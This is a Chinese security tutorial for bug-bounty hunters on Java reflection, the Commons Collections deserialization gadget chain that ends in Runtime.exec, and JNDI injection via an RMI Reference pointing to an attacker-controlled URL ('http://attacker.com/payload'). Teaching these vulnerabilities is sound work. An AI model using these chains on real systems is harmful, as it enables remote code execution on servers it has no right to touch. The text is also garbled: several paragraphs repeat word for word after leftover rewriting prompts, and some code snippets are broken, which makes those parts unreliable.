#  领导没事就会拿这些基础PUA你 挖掘SRC表示也得掌握java基础漏洞原理   
原创 马超  网安守护   2024-06-09 23:51  
  
### 反射  
  
反射是Java中的一个高级特性一样。而反射的特性不仅引出了动态代理、AOP、RMI、EJB等技术，也为后续的学习提供了基础。  
  
在探索反射的原理与漏洞之前，我们需要深入了解反射的机制。反射让我们能够在运行时动态地操作类、对象、方法等，这为程序的灵活性和功能性提供了无限的可能。然而，正是这种灵活性也引发了一些安全隐患，比如潜在的漏洞问题。  
### 什么是反射  
  
在日常的Java开发中，反射机制扮演着至关重要的角色。它赋予了我们在运行时获取类的各种信息和操作对象的能力，无论是类的构造方法、成员变量、还是方法，甚至私有变量和方法都能被访问。  
  
这种灵活的机制使得我们可以在程序运行的过程中，动态地探索和操作类的结构和行为。无论是通过获取类的信息还是调用对象的方法，反射机制都为我们提供了强大的工具，极大地拓展了Java语言的灵活性和适用性。  
  
因此，在日常开发中，了解和熟练运用反射机制是非常重要的。它不仅可以帮助我们解决一些动态性的需求，还能够提升代码的灵活性和可扩展性，使得我们的程序更加健壮和易于维护。  
### 反射方法  
  
Java反射机制为我们提供了在运行时动态地获取类的信息以及调用对象的方法的能力。这种灵活性使得我们能够在不知道具体类型的情况下进行操作，从而实现更加灵活和通用的编程。  
#### 获取class的字节码对象  
  
反射提供了对于运行时类的查询和调用的能力。首先，我们需要获取类的字节码对象，即Class对象。有三种方式可以实现这一目标。  
  
方式一：  
```
Class.forName("类的字符串名称");
```  
  
方式二：  
```
简单类名.class;
```  
  
方式三：  
```
Object对象.getClass();
```  
  
这三种方式的区别主要在于调用者和加载方式。方式一通过类的字符串名称动态加载类，方式二直接使用类的类字面常量，而方式三是在对象实例上调用getClass()方法。这些方式的选择取决于实际需求和加载策略，Java会按需加载类，因此一些不常用的类可以暂时不加载。  
### 获取构造函数  
  
获取所有公开的构造函数可以使用 getConstructors() 方法。  
  
要获取单个公开的构造函数，可以使用 getConstructor(参数类型) 方法。  
  
若需要获取所有构造函数，包括私有的，可以使用 getDeclaredConstructors() 方法。  
  
而要获取一个所有的构造函数，可以使用 getDeclaredConstructor(参数类型) 方法。  
### 获取名字  
  
可以使用反射来获取类名。  
  
要获取类的全名，可以使用 getName() 方法，例如：com.test.Demo。  
  
要获取类名，可以使用 getSimpleName() 方法，例如：Demo。  
### 获取方法  
  
使用 getMethods() 方法可以获取所有公开的方法。  
### 获取字段  
  
获取所有的公开字段，可以使用 getFields() 方法。  
  
如果需要获取特定名称的公开字段，可以使用 getField(String name) 方法。  
  
要获取所有的字段，包括私有字段，可以使用 getDeclaredFields() 方法。  
  
而要获取指定名称的所有字段，可以使用 getDeclaredField(String name) 方法。  
### 设置访问属性  
  
通过设置 Field 对象的可访问性，我们可以访问私有字段。  
  
调用 Field.setAccessible(true) 方法可以将可访问性设置为 true，从而允许访问私有字段。  
  
调用 Field.setAccessible(false) 方法可以将可访问性设置为 false，使得私有字段不可访问。  
  
此外，通过 Method 类的 invoke 方法，我们可以调用对象的方法。  
  
invoke(Object obj, Object... args) 方法接受一个对象实例及其参数，调用该对象对应的方法。  
  
**打怪修炼—实战示例**  
  
来看一个执行运行计算器。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYYpewIagrn1k6AOUXd6CjAENs2IA0dBCibeU7VjA5M0A20fvX8ibLpw2A/640?wx_fmt=png "")  
  
通过 Class.forName 获取字节码对象后，可以使用 getMethod 获取 Runtime 类的 getRuntime 方法，并使用 invoke 执行该方法，然后再次使用 exec 方法执行计算器命令。  
  
至于反射漏洞，我们可以详细讨论一下。  
### 反射攻击  
#### 通过反射来突破单例模式  
  
正是的。比如，通过反射机制可以访问单例类的私有构造方法，并强制创建多个实例。这违背了单例模式的初衷，因为单例类的构造方法应该是私有的，以防止外部直接创建实例。所以，要注意在单例类中添加特定的逻辑来防止通过反射机制绕过单例模式的限制。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYAmO2mgHsOiaibsqqHWfgJNib0m8wJ95oNHOicjRW39MuMYNkS3YPxYZA1g/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYf5Qd7j2Q7JtNsqEU7IwsZ1QralOUVIvANYezyWQTiapGsPaZbQuyFjw/640?wx_fmt=png "")  
  
结果：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYLRxGfUMXbGMJpKGFpGC2m9Y22smQoJTh5YPqxVjMucicIuSrcB1Lc7g/640?wx_fmt=png "")  
  
通过反射，即使是私有构造方法也可以被调用，这可能会导致单例模式的破坏。私有构造方法确实可以保证在普通情况下无法直接创建新实例，但反射机制使得即使是私有的构造方法也能被访问到，从而绕过了单例模式的限制。因此，在设计单例模式时，除了私有构造方法外，还需要添加额外的逻辑来防止通过反射机制来绕过单例模式的限制。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYQXCpHnqpLw6a4V0jHHjnjzib4OkWQgL5ryTTXgkccjyUjl5OvxibomiaA/640?wx_fmt=png "")  
  
结果：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYTUVPibudrCCOxzSehiaEDQWy25sKBQI3a8hNcLjsfU87UuIXyMUQGeWg/640?wx_fmt=png "")  
  
是的，这是一种常见的解决方案。在单例类的构造方法中，可以添加逻辑来检查是否已经存在实例，如果存在则抛出异常，防止通过反射机制绕过单例模式的限制。这样可以确保即使是通过反射调用私有构造方法，也无法创建多个实例。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYaRHKjQtP9v2g7EZIZEeZjLzgzHHicQZSwYMpzuLohnmUzutwicUA03iaQ/640?wx_fmt=png "")  
#### 通过反射来突破泛型限制  
  
比如，通过擦除机制，可以在运行时动态获取泛型类型的信息，从而绕过了编译时的类型检查，可能导致意外的行为发生。这就是一种不好的代码实践，可能会破坏泛型的安全性和规范性。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYFLpe7TrmqJbUC8icRx2d4Z0urBXpQNPic099O2lKG8ib0dH1mmiacK9B6w/640?wx_fmt=png "")  
  
抛异常。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYIxWk9oCAASDiaB0oUiaeWv4tAQMqB3k0sYXGeTOaicaU7nqHcGOjSZ1Wg/640?wx_fmt=png "")  
  
同样通过反射：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYtqC6IhfFYV1jYZ0kiadPT3QLFrsp15ZSlfX089oMGISzWkZcamJdNPA/640?wx_fmt=png "")  
  
如下。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYdplR9g0AyxnL6K7SKZjcBI9kyRfJJgyngN5icEJqrHz7bHnBnB627Zg/640?wx_fmt=png "")  
在黑暗的角落，禁止的名单悄然展开，反射被无情地封锁。然而，绕道而行，总是有一线生机。  
#### 利用反射链的序列化漏洞  
  
在那些往昔的岁月里，序列化漏洞的文章随处可见，它们如同构造的序列，一一展开。  
  
让我们窥探一段代码的实现：  
```
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(
        "getMethod",
        new Class[] {String.class, Class[].class},
        new Object[] {"getRuntime", new Class[0]}
    ),
    new InvokerTransformer(
        "invoke",
        new Class[] {Object.class,Object[].class},
        new Object[] {null, null}
    ),
    new InvokerTransformer(
        "exec",
        new Class[] {String[].class},
        new Object[] { commandstring }
        //new Object[] { execArgs }
    )
};
```  
  
现在，让我们深入InvokerTransformer类的transform方法，探索其源码的奥秘。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYiaeeuUZdRfAIPLzssxr9AUaESYicMEm3tgk9aviatYwjfqUKUnEHKcpUA/640?wx_fmt=png "")  
  
在战后的余波中，我们对那场战斗进行了深刻的总结与分析。  
  
首先，让我们聚焦于一段代码，它如同战场上的命令，精确而迅速地执行：  
```
Object[] argss = new Object[]{"getRuntime", null};
Method mm = (Method) Runtime.class.getClass()
    .getMethod("getMethod", new Class[]{String.class, Class[].class})
    .invoke(Runtime.class, argss);
```  
  
这行代码，就像是在战场上下达的一道命令，其效果等同于：  
```
Method mm = Runtime.class.getMethod("getRuntime", null);
```  
  
紧接着，我们看到了另一次行动，它如同战场上的一次突袭：  
```
Runtime rr = (Runtime) mm.getClass()
    .getMethod("invoke", new Class[]{Object.class, Object[].class})
    .invoke(mm, new Object[]{null, null});
```  
  
这等同于执行了：  
```
mm.invoke();
```  
  
随后，我们看到了一个决定性的行动：  
```
rr.getClass().getMethod("exec", new Class[]{String.class})
    .invoke(rr, "calc");
```  
  
这相当于执行了：  
```
rr.exec("calc");
```  
  
在这里，rr已经成为了Runtime对象，而非Runtime类。  
  
在这场代码的战斗中，ConstantTransformer扮演了一个关键角色。在初始化时，它将一个final变量放入其中，使得transform(任意Object)始终返回那个变量。  
  
最后，我们利用jd-gui这一工具，窥探了ChainedTransformer的源码，如同在战后的废墟中寻找着隐藏的秘密。  
  
现在，让我们将这些片段重新组合，以一种更加生动、节奏感强烈的方式呈现：  
  
在战场上，命令如同代码般迅速执行。首先，我们下达了获取getRuntime方法的命令：  
```
Method mm = Runtime.class.getMethod("getRuntime", null);
```  
  
紧接着，我们执行了一次突袭，调用了这个方法：  
```
Runtime rr = (Runtime) mm.invoke();
```  
  
然后，我们利用这个Runtime对象，执行了一次决定性的行动：  
```
rr.exec("calc");
```  
  
在这个过程中，ConstantTransformer始终如一地返回那个关键的final变量，而ChainedTransformer的源码，就像战后的秘密，等待着我们去揭开。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYYyxBxhpuChnXXsObyicIjAmBeBl3Sbxr0LCpTQMnrwLVfSB9e8zQrdQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYibD6ugTyvz7Y0NoM97FgEZdS5NBPbrbHiaGYZd23K5WL8ibSDsxjqzgCA/640?wx_fmt=png "")  
  
在战火的余烬中，我们发现了一种利用反射的巧妙手段。以下是一段代码，它像是一位老练的战士，精准地执行着每一个命令：  
```
Transformer[] transformer = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
chainedTransformer.transform(Object.class);
```  
  
这段代码，如同战场上的一系列精准打击，首先，我们通过ConstantTransformer确立了目标——Runtime类。接着，我们使用InvokerTransformer连续发起攻击，获取getRuntime方法，然后调用它，最后执行exec命令。  
  
正如之前所述，ConstantTransformer的特性使得最终执行的Object.class可以是任何对象，哪怕是null或者一个新创建的对象。  
  
现在，我们面临一个问题：如何不通过调用transform方法来执行这个反射链呢？  
  
答案是：我们需要找到实现transform方法本身的地方。  
  
经过一番搜寻，我们发现了AbstractInputCheckedMapDecorator类，它隐藏着我们需要的秘密。在这个类中，我们找到了反射链的实现，它就像是战场上的指挥官，控制着整个行动的节奏。  
  
让我们将这些信息重新编织，以一种更加生动、充满节奏感的方式呈现：  
  
在代码的战场上，我们首先确立了目标——Runtime类。然后，我们通过一系列InvokerTransformer，如同战场上的连续攻击，获取了getRuntime方法，调用了它，并执行了exec命令。  
  
在这个过程中，ConstantTransformer始终如一地返回那个关键的final变量，而ChainedTransformer则是我们的指挥官，控制着整个行动的节奏。  
  
然而，我们不满足于仅仅通过调用transform方法来执行这个反射链。我们想要深入到战场的核心，找到实现transform方法本身的地方。  
  
经过一番搜寻，我们终于发现了AbstractInputCheckedMapDecorator类，它隐藏着我们需要的秘密。在这个类中，我们找到了反射链的实现，它就像是战场上的指挥官，控制着整个行动的节奏。  
  
现在，让我们将这些信息重新编织，以一种更加生动、充满节奏感的方式呈现：  
  
在代码的战场上，我们首先确立了目标——Runtime类。然后，我们通过一系列InvokerTransformer，如同战场上的连续攻击，获取了getRuntime方法，调用了它，并执行了exec命令。  
  
在这个过程中，ConstantTransformer始终如一地返回那个关键的final变量，而ChainedTransformer则是我们的指挥官，控制着整个行动的节奏。  
  
然而，我们不满足于仅仅通过调用transform方法来执行这个反射链。我们想要深入到战场的核心，找到实现transform方法本身的地方。  
  
经过一番搜寻，我们终于发现了AbstractInputCheckedMapDecorator类，它隐藏着我们需要的秘密。在这个类中，我们找到了反射链的实现，它就像是战场上的指挥官，控制着整个行动的节奏。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYY2LykeU2HHkOKIKGyNoDDibGwXfzswCY5eoQvd6JZEf5SpAbWGSZybibg/640?wx_fmt=png "")  
  
TransformedMap类下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYxQZUaHE0lEujgAl7koFp968ibGjQ4AtpiaRrYwkeC9faEYc0jJh9l38A/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYY5xpIGQIjUibg452GqMjXibpw5J7RR74yOdIVKBNc4yaibf6yRPnjcWttw/640?wx_fmt=png "")  
  
在TransformedMap的领域内，我们的目标是操纵valueTransformer，将其设定为一个ChainTransformer对象。为了实现这一点，我们需要精准地定位到这个值的赋值点。  
```
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

// 赋值点，将chainTransformer设置为valueTransformer
valueTransformer = chainedTransformer;
```  
  
在这个过程中，我们首先构建了一个Transformer数组，每个元素都是一个特定的变换步骤。然后，我们创建了一个ChainedTransformer对象，将这个数组作为参数传递给它。最终，我们找到了关键的赋值点，将ChainedTransformer对象赋值给valueTransformer，从而控制了整个变换链。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYY1oAwHG1N3icbPKKxGGQU2c9aH2DmvM4DhDmfrv3FAc66Oia2Mp3HnB6g/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYY4aj42REPxibBZ80Xqbwia60lpJceaoRTavOrxHmeFrDx022waUNgaTDg/640?wx_fmt=png "")  
  
我们踏着节奏，一步步构建起我们的链环：  
```
// 初始的Map容器，承载着我们的秘密
Map mp = new HashMap();
mp.put("ok", "notok"); // 赋值的微妙之处，为后续的setValue铺路

// 装饰Map，赋予它变换的能力
Map dd = TransformedMap.decorate(mp, null, chainedTransformer);

// 通过Entry的视角，深入Map的内部
Map.Entry entry = (Entry) dd.entrySet().iterator().next();

// 改变值，让目标显现
entry.setValue("ok");

// 绕过黑名单，反射链的巧妙运用
// 利用序列化的力量，达到最终目的
```  
  
在这个过程中，我们首先创建了一个HashMap，然后巧妙地放入了一个键值对。接着，我们使用TransformedMap.decorate静态方法，将我们的mp和chainedTransformer结合起来，赋予了Map新的变换能力。  
  
随后，我们通过迭代器深入Map的内部，获取了一个Entry对象。通过改变这个Entry的值，我们悄然接近了我们的目标。  
  
最后，我们绕过了黑名单的限制，利用反射链的巧妙运用，并通过序列化的力量，实现了我们的目的。每一步都充满了节奏感，引领着读者深入代码的世界。  
## 金丹期--反序列化篇  
  
在Java的世界中，序列化是一种魔法，它将活生生的对象转化为字节的序列，让它们可以在JVM的内存中自由游荡，甚至跨越文件和网络的边界。  
```
// 想象一下，一个Java对象，即将踏上它的旅程
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("filename.ser"));
oos.writeObject(theObject); // 它被转化为字节，写入到文件中
oos.close(); // 完成它的使命
```  
  
而在另一端，反序列化则是召唤仪式，将那些字节序列重新召唤为Java对象，恢复它们的生命：  
```
// 这些字节序列，即将被唤醒
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("filename.ser"));
Object theObject = ois.readObject(); // 字节序列被重新构造成Java对象
ois.close(); // 召唤仪式结束
```  
  
通过ObjectOutputStream的writeObject()方法，对象被赋予了穿越空间的能力。而ObjectInputStream的readObject()方法，则让这些对象在新的JVM中重生。这是Java序列化和反序列化的奇妙旅程。  
  
**知己知彼之什么是序列化，反序列化**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYY9XxrYkZVbF90S5Xfl96icDhM5KXEvvZCqgngdWvtL1ibejoVsBpI58Ag/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYY04sfVzr79aGIea0wDAmdULPky7FUzAfQFkUp17ia5f6iba2jE6IErx5Q/640?wx_fmt=png "")  
  
如下:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYYu55zCK8YEbYEELtHPZWyzIicpCwe7UVHg8de5dG30VMk661FdGqjHQ/640?wx_fmt=png "")  
  
这就是序列化和反序列化的过程。  
  
**金丹实战--反序列化漏洞示例**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYrrqBPwmDZqSAlUd9DUwbFPLsEutgYewYffwS0vticlibC7W7V5EP6nTA/640?wx_fmt=png "")  
  
实战  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYFiaQJrrg0j4UnrT9F0icyic91oQaMSdfqd2Gqpvv1Q07oBicj0l8HqTAIQ/640?wx_fmt=png "")  
  
在Java的序列化机制中，readObject方法扮演着关键角色。当对象从字节序列被恢复时，这个方法被自动调用，允许对象在反序列化过程中恢复其状态。然而，如果不当心，这个过程也可能成为恶意代码的温床。  
```
// 想象一下，一个恶意的readObject方法，静静潜伏在代码之中
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    // 恶意代码可能在这里被触发
}
```  
  
反序列化利用的方式多种多样，攻击者可以利用这一点来执行远程代码执行（RCE）攻击。例如，通过构造一个恶意的对象图，攻击者可以在反序列化过程中触发特定的readObject方法，进而执行恶意代码。  
  
**JNDI注入**  
  
在Java的序列化和反序列化中，readObject方法的利用是前人智慧的结晶，它为我们提供了深入理解Java安全机制的机会。现在，让我们将目光转向JNDI漏洞的原理，这是一条充满挑战的道路。  
```
// 在JNDI的探索之旅中，我们首先需要搭建一个Registry
Registry registry = LocateRegistry.createRegistry(1099);
```  
  
JNDI漏洞的核心在于lookup参数的可控性。当我们可以控制这个参数时，我们有机会传入Reference类型及其子类的对象。在远程调用类的过程中，JNDI服务首先会在RMI服务器的classpath中寻找对应的类。如果本地classpath中没有找到，它会尝试从提供的URL地址加载类。  
```
// 这里，我们构建了一个Reference，它指向一个远程的类
Reference ref = new Reference("someClassName", "someURL");
```  
  
如果JNDI服务在本地和远程都找不到对应的类，lookup调用就会失败。但是，如果我们可以控制这个URL，我们就有可能加载恶意的类，从而触发安全漏洞。  
  
为了利用这个漏洞，攻击者可能会：  
1. **控制lookup参数**：通过精心构造的输入，控制JNDI的lookup过程。  
  
1. **提供恶意的URL**：指向一个攻击者控制的服务器，该服务器上存放着恶意的类文件。  
  
1. **加载恶意类**：通过JNDI的远程类加载机制，加载并执行恶意的类。  
  
Server:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYY4zibz8NxFXouO0ms7DYrvIxzBjUViaQOCh4I6myMXxlfuYddaYJauUtA/640?wx_fmt=png "")  
  
在JNDI的探索中，我们构建了Reference对象，设定了恶意的类名和web服务的URL，然后将其绑定到注册表中：类似代码。。。  
```
Registry registry = LocateRegistry.createRegistry(1099);
Reference ref = new Reference("PayloadClass", "PayloadLocation", "http://attacker.com/payload");
registry.bind("jndi/payload", ref);
```  
  
ExecTest:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYxQLibpG7Jrb8ujhibsftibatQufpeZRF8efmVaibUjCFt3bOXfzLHMArFA/640?wx_fmt=png "")  
  
静态块中隐藏着我们的payload，一旦类被加载，它就会自动执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYERv4zpll3pG8BicbxTJ36gPLGw2ibDvIJbF4tj9F2Hs2Bualg9SjL8bA/640?wx_fmt=png "")  
  
在D盘上，编译好的ExecTest.class文件静静躺着，Web服务已经启动，准备将这个字节码文件作为payload传递。  
```
// 编译ExecTest.java为1.5 JDK版本的字节码文件
javac -source 1.5 -target 1.5 ExecTest.java

// 删除本地的ExecTest.class，确保JNDI进行远程加载
delete ExecTest.class;

// 将ExecTest.class放置于D盘，并确保Web服务已开启
```  
  
Client：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYh510Tou8NXK42hdk35ARNJwuRCwRWyE8GC2aETupvBvAy7hTgCeeaA/640?wx_fmt=png "")  
  
启动服务器，执行客户端，以下是可能的输出：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYzwTQHX6ice8SdEN8InSnhXBfB6Kl3FG21bQicrDGQ3QYcGvqctuWlT0w/640?wx_fmt=png "")  
  
远程加载ExecTest.class文；  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYe9IAuNjpzDBV73hrw1cnyJI2NbNONYEfn2ogjRiczia2AtcQoYL7z2Cw/640?wx_fmt=png "")  
在版本1.6及以下，成功执行命令后，若要绕过限制，需对应添加以下代码：  
  
将 com.sun.jndi.rmi.object.trustURLCodebase 和 com.sun.jndi.cosnaming.object.trustURLCodebase 这两个属性的值设置为true，这样就允许从远程的Codebase加载Reference工厂类了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s54jFxUm1jiasR6K0AXPib3DYYvEDgeXicvRwhnibvFX4ibo7Sc4oRPjf8e1EuBrEKMNRpKic9G0ibrgTTPLw/640?wx_fmt=png "")  
  
此处提到了一种绕过限制的方法，即利用LDAP和JNDI请求LDAP地址，通过LDAP反序列化执行本地Gadget来绕过限制。  
#### 总结  
  
在Java中，RMI（远程方法调用）是一项基础技术，它为诸如EJB等更多技术提供了基础。为了跨语言支持，Web服务也变得常见，利用SOAP协议实现了与平台无关的通信。比如，Weblogic在RMI上使用了T3协议等。因此，了解RMI和Java基础漏洞对于提升自己的修炼非常重要。只有深入了解对手的技术，才能在战斗中获得胜利。  
  
修炼之路永无止境，万事万物皆如此。只有集中精神，不断修炼，才能变得更强大，以至于在战斗中不被轻易击败。  
  
  
